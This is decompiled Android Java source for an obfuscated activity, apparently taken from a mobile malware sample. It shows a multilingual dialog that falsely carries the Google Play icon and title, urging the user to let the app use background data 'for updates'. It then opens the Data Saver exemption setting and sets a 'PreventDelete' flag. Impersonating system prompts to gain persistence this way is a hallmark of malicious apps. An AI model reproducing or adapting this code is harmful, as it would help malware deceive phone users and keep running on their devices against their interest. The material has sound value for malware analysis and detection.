/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.app.AlertDialog$Builder
 *  android.content.BroadcastReceiver
 *  android.content.Context
 *  android.content.DialogInterface
 *  android.content.DialogInterface$OnClickListener
 *  android.content.Intent
 *  android.content.IntentFilter
 *  android.content.pm.PackageManager$NameNotFoundException
 *  android.net.ConnectivityManager
 *  android.net.Uri
 *  android.os.Bundle
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Bundle;
import java.util.Locale;
import linker.resourcer.encoder.ffbrxjknfnpfxahr;
import linker.resourcer.encoder.jhvbzpdwpbqgticwdxuva;

public class fcthltsynhhwdppwuqxrf
extends Activity {
    private DataSaverChangedBroadcastReceiver dataSaverChangedBroadcastReceiver = new DataSaverChangedBroadcastReceiver();
    boolean isregisterd = false;

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void askit() {
        int n;
        String string2;
        AlertDialog.Builder builder;
        String string3;
        block20: {
            string3 = Locale.getDefault().getLanguage();
            builder = new AlertDialog.Builder((Context)this, 16974545);
            string2 = ffbrxjknfnpfxahr.getLabelApplication(this.getApplicationContext()).toLowerCase();
            switch (string3.hashCode()) {
                case 3886: {
                    if (!string3.equals("zh")) break;
                    n = 2;
                    break block20;
                }
                case 3710: {
                    if (!string3.equals("tr")) break;
                    n = 3;
                    break block20;
                }
                case 3651: {
                    if (!string3.equals("ru")) break;
                    n = 4;
                    break block20;
                }
                case 3241: {
                    if (!string3.equals("en")) break;
                    n = 0;
                    break block20;
                }
                case 3121: {
                    if (!string3.equals("ar")) break;
                    n = 1;
                    break block20;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                string3 = "OK";
                builder.setMessage((CharSequence)("Allow " + string2 + " to use background data for updates."));
                break;
            }
            case 4: {
                string3 = "\u0412\u043a\u043b\u044e\u0447\u0438\u0442\u044c";
                builder.setMessage((CharSequence)("\u0420\u0430\u0437\u0440\u0435\u0448\u0438\u0442\u0435 " + string2 + " \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u0434\u0430\u043d\u043d\u044b\u0435 \u0432 \u0444\u043e\u043d\u043e\u0432\u043e\u043c \u0440\u0435\u0436\u0438\u043c\u0435 \u0434\u043b\u044f \u043e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0439."));
                break;
            }
            case 3: {
                string3 = "Tamam";
                builder.setMessage((CharSequence)(string2 + " uygulamas\u0131n\u0131n g\u00fcncellemeler i\u00e7in arka planda veri kullanmas\u0131na izin verin."));
                break;
            }
            case 2: {
                string3 = "\u542f\u7528";
                builder.setMessage((CharSequence)("\u5141\u8bb8 " + string2 + " \u5728\u540e\u53f0\u4f7f\u7528\u6570\u636e\u4ee5\u83b7\u53d6\u66f4\u65b0\u3002"));
                break;
            }
            case 1: {
                string3 = "\u062a\u0641\u0639\u064a\u0644";
                builder.setMessage((CharSequence)("\u0627\u0633\u0645\u062d \u0644\u0640 " + string2 + " \u0628\u0627\u0633\u062a\u062e\u062f\u0627\u0645 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a \u0641\u064a \u0627\u0644\u062e\u0644\u0641\u064a\u0629 \u0644\u0644\u062a\u062d\u062f\u064a\u062b\u0627\u062a."));
                break;
            }
            case 0: {
                string3 = "Enable";
                builder.setMessage((CharSequence)("Allow " + string2 + " to use background data for updates."));
            }
        }
        try {
            builder.setIcon(this.getPackageManager().getApplicationIcon("com.android.vending"));
            builder.setTitle((CharSequence)"Google Play");
        }
        catch (PackageManager.NameNotFoundException nameNotFoundException) {
            try {
                builder.setIcon(this.getPackageManager().getApplicationIcon("com.android.settings"));
                builder.setTitle((CharSequence)"Settings");
            }
            catch (PackageManager.NameNotFoundException nameNotFoundException2) {
                try {
                    builder.setIcon(this.getPackageManager().getApplicationIcon(this.getPackageName()));
                    builder.setTitle((CharSequence)string2);
                }
                catch (PackageManager.NameNotFoundException nameNotFoundException3) {
                    nameNotFoundException3.printStackTrace();
                    builder.setIcon(null);
                    builder.setTitle((CharSequence)"");
                }
            }
        }
        builder.setPositiveButton((CharSequence)string3, new DialogInterface.OnClickListener(this){
            final fcthltsynhhwdppwuqxrf this$0;
            {
                this.this$0 = fcthltsynhhwdppwuqxrf2;
            }

            public void onClick(DialogInterface dialogInterface, int n) {
                jhvbzpdwpbqgticwdxuva.PreventDelete = true;
                try {
                    dialogInterface = new Intent("android.settings.IGNORE_BACKGROUND_DATA_RESTRICTIONS_SETTINGS");
                    dialogInterface.setData(Uri.fromParts((String)"package", (String)this.this$0.getPackageName(), null));
                    dialogInterface.addFlags(0x10000000);
                    this.this$0.startActivity((Intent)dialogInterface);
                }
                catch (Exception exception) {
                    // empty catch block
                }
                this.this$0.finish();
            }
        });
        builder.show();
    }

    public void finish() {
        super.finish();
    }

    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        bundle = (ConnectivityManager)this.getSystemService("connectivity");
        if (bundle.isActiveNetworkMetered()) {
            switch (bundle.getRestrictBackgroundStatus()) {
                default: {
                    jhvbzpdwpbqgticwdxuva.PreventDelete = false;
                    this.finish();
                    break;
                }
                case 3: {
                    this.askit();
                }
            }
            this.registerReceiver(this.dataSaverChangedBroadcastReceiver, new IntentFilter("android.net.conn.RESTRICT_BACKGROUND_CHANGED"));
            this.isregisterd = true;
        } else {
            this.finish();
            jhvbzpdwpbqgticwdxuva.PreventDelete = false;
        }
    }

    protected void onDestroy() {
        super.onDestroy();
        try {
            if (this.isregisterd) {
                this.unregisterReceiver(this.dataSaverChangedBroadcastReceiver);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static class DataSaverChangedBroadcastReceiver
    extends BroadcastReceiver {
        private DataSaverChangedBroadcastReceiver() {
        }

        public void onReceive(Context context, Intent intent) {
        }
    }
}

